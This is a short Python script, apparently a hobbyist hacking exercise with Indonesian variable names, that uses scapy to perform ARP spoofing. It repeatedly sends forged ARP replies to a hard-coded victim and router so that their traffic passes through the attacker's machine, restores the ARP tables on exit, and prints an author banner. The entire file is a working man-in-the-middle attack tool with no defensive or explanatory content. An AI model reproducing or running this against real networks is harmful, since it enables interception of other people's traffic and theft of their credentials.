#!/usr/bin/env python

import scapy.all as scapy
import time

def dapetmac_nuz(ip,):
    minta_arp = scapy.ARP(pdst=ip)
    penyiaran = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    minta_arp_penyiaran = penyiaran/minta_arp
    daftar_terjawab = scapy.srp(minta_arp_penyiaran, timeout=1, verbose=False)[0]

    return daftar_terjawab[0][1].hwsrc


def ganti_nuz(iptarget,ipganti):
    mactarget = dapetmac_nuz(iptarget)
    paket = scapy.ARP(op=2, pdst=iptarget, hwdst=mactarget, psrc=ipganti)
    scapy.send(paket, verbose=False)

def mulaiulang_nuz(iptujuan, ipsumber):
    mactujuan = dapetmac_nuz(iptujuan)
    macsumber = dapetmac_nuz(ipsumber)
    kardus = scapy.ARP(op=2, pdst=iptujuan, hwdst=mactujuan, psrc=ipsumber, hwsrc=macsumber)
    scapy.send(kardus, count=4, verbose=False)

iptarget = "192.168.78.154"
iprouter = "192.168.78.2"

try:
    hitungpaket = 0
    while True:
        ganti_nuz(iptarget, iprouter)
        ganti_nuz(iprouter, iptarget)
        hitungpaket = hitungpaket + 2
        print("\rKardus DALAM PERJALANAN >>> " + str(hitungpaket) + " Kardus SUDAH SAMPAI TUJUAN")
        time.sleep(2)
except KeyboardInterrupt:
    print("\t[!] PENGIRIMAN TELAH DILIBURKAN [!]\n")
    mulaiulang_nuz(iptarget, iprouter)
    mulaiulang_nuz(iprouter, iptarget)
    penutupan = '''
        dibuat dengan niat oleh 
         ______   _ _   _ _   _ _______________
        |__  / | | | \ | | | | |__  /__  /__  /
          / /| | | |  \| | | | | / /  / /  / / 
         / /_| |_| | |\  | |_| |/ /_ / /_ / /_ 
        /____|\___/|_| \_|\___//____/____/____|

        https://steamcommunity.com/id/zunuzzz/

        =========GUNAKAN DENGAN BIJAK=========
        '''

    print(penutupan)


